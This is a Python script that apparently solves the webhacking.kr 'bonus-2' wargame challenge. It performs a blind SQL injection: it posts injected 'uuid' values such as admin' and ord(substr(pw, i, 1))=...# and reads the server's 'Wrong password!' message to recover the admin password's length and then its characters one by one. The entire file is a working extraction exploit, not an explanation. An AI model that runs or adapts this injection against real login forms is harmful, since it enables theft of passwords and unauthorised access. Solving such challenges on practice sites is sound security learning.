import requests
import string

url="https://webhacking.kr/challenge/bonus-2/index.php"
cookies={'PHPSESSID':""}
ascii_code=string.digits+string.ascii_letters
utf="utf-8"

def getLength():
    for i in range(1, 100):
        print("(+) Started {}".format(i))
        response=requests.post(url, data={'uuid':"admin' and length(pw)={}#".format(i), 'pw':"1234"}, cookies=cookies)

        if response.text.find("Wrong password!")>0:
            print("(+) pw length is {}".format(i))
            break

def getPW():
    result=""
    for i in range(1, 33):
        print(f"(+) {i} index started.")
        for char in ascii_code:
            uuidParams=f"admin' and ord(substr(pw, {i}, 1))={ord(char)}#"
            response = requests.post(url, data={'uuid':uuidParams, 'pw': "1234"}, cookies=cookies)

            if response.text.find("Wrong password!") > 0:
                result+=char
                print("(+) Current Result is {}".format(result))

if __name__=="__main__":
    #getLength()
    getPW()
